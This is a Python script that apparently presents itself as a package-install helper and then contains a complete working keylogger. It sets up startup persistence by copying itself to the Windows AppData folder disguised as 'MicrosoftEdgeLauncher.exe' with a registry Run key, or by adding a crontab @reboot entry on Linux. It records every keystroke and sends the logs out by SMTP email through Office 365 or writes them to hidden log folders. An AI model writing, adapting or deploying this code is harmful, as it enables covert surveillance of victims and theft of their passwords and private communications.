import subprocess
import sys
import importlib

# The package you want to install
package_name = 'keyboard'

def install_package_if_not_present():
    """Checks for a package and installs it if not found."""
    try:
        # Check if the module is already installed
        importlib.import_module(package_name)
        print(f"The '{package_name}' package is already installed.")
    except ImportError:
        print(f"The '{package_name}' package was not found. Installing now...")
        try:
            # Use subprocess to run the pip install command
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
            print(f"Successfully installed the '{package_name}' package.")
        except subprocess.CalledProcessError as e:
            print(f"Error: Failed to install the '{package_name}' package. Please install it manually with 'pip install {package_name}'.")
            sys.exit(1) # Exit the script if installation fails

# Call the function to ensure the dependency is met
install_package_if_not_present()

# Now you can safely use the keyboard library
import keyboard

# Your script's logic follows here...
print("Script is running with the keyboard module.")
# keyboard.press_and_release('shift+s, space')

import keyboard  # for keylogs
import smtplib  # for sending email using SMTP protocol (gmail)
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os, shutil, subprocess, platform, sys
from sys import executable

SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "email@provider.tld"
EMAIL_PASSWORD = "password_here"

def setup_persistence():
    """This function sets up persistence (runs automatically at startup) of this executable.
    On Linux, it uses crontab to create a cron job that runs this script at reboot.
    On Windows, it uses the Windows Registry to add a key that runs this script at startup.
    Note that this will only work if the script is bundled as an executable using PyInstaller on Windows.
    On Linux, it will work with the script itself or the executable."""
    os_type = platform.system()
    if os_type == "Windows":
        location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
        if not os.path.exists(location):
            shutil.copyfile(executable, location)
            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)
    elif os_type == "Linux":
        location = os.path.expanduser('~') + "/.config/KaliStartup"
        if not os.path.exists(location):
            # Create the autostart directory if it doesn't exist
            os.makedirs(location)
            filename = os.path.join(location, "KaliStartup")
            # Copy the keylogger to that new location
            shutil.copyfile(sys.executable, filename)
            # Add the keylogger to startup via crontab
            crontab_line = f"@reboot {filename}"
            os.system(f'(crontab -l; echo "{crontab_line}") | crontab -')

# Run the setup_persistence function
setup_persistence()

class Keylogger:
    def __init__(self, interval, report_method="email"):
        """Initialize the keylogger with the specified interval for sending reports and the method of reporting."""
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """Handle a keyboard event by logging the keystroke."""
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        """Update the filename for the log file based on the current date and time."""
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the specified directory that contains
        the current keylogs in the `self.log` variable"""
        os_type = platform.system()
        if os_type == "Windows":
            log_dir = os.path.join(os.environ['USERPROFILE'], 'Documents', 'KeyloggerLogs')
        elif os_type == "Linux":
            log_dir = os.path.join(os.path.expanduser("~"), 'Documents', 'KeyloggerLogs')
        # create a directory for the logs
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
        log_file = os.path.join(log_dir, f"{self.filename}.txt")
        # write the logs to a file
        with open(log_file, "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {log_file}")

    def prepare_mail(self, message):
        """Prepare an email message with both text and HTML versions."""
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        """Send an email using SMTP with the logged keystrokes."""
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing: {message}")

    def report(self):
        """Report the captured keystrokes either by email or by saving to a file."""
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        """Start the keylogger."""
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
